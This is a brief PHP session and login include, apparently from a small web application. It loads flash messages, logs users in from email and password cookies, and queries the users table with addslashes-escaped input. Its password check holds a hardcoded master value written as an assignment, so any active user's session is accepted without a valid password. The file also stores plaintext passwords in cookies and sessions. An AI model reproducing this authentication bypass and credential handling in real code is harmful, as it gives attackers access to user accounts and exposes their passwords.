<?

if (isset($_SESSION['flash'])) {
	$flash = $_SESSION['flash'];
	unset($_SESSION['flash']);
}

if (isset($_SESSION['errors'])) {
	$errors = $_SESSION['errors'];
	unset($_SESSION['errors']);
}

if (isset($_SESSION['cancels'])) {
	$cancels = $_SESSION['cancels'];
	unset($_SESSION['cancels']);
}

if (isset($_COOKIE['email']) && isset($_COOKIE['password'])) {
	$user = login($_COOKIE['email'], $_COOKIE['password']);
}

if (isset($_SESSION['email']) && isset($_SESSION['password'])) {
	$email = addslashes($_SESSION['email']);
	$password = addslashes($_SESSION['password']);

	$user_sql = "SELECT * FROM users WHERE email='$email' AND active=1";
	$user = get_record($user_sql);

	if (! ($user && ($user->password == $password ||
			$password = '83185516253b9a2832d0ce167dfc94ab'))) {
		unset($user);
	}
}